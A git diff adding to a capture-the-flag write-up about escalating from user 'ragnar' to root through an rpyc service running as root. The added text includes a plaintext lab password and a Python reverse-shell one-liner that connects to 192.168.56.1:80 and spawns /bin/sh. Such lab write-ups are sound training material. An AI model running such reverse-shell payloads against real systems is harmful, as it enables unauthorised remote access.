@@ -12,6 +12,10 @@ Learn new things, and make sure that you enum first then hack.
 
 Discord- luckythandel#6053 {for any-hint}.
 
+# My rating
+Fun: 5/5
+Interresting: 5/5
+Difficult: 3/5
 
 # Enumeration 
 
@@ -73,13 +77,38 @@ using password --> Worked!
 
 ![ragnar flag](05.png)
 
-
 ![puzzlee](06.png)
 
 using https://cyberchef.org to cleanup the output
 ![cyberchef](07.png)
 
 su ragnar
+pass: mR)|>^/Gky[gz=\.F#j5P(
+
+
+Check the apps that are run as root
+
+```bash
+ps aux| grep root
+
+```
+There is a supicious python application running
+![supicious app](08.png)
+
+
+Searching on the web I found:
+![warning](09.png)
+
+
+The reverse shell worked using port 80
+```bash
+python3
+>>> import rpyc
+>>> conn = rpyc.classic.connect('localhost')
+>>> conn.execute('import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")')
+```
+Reverse shell:
+![warning](10.png)
 
 
 
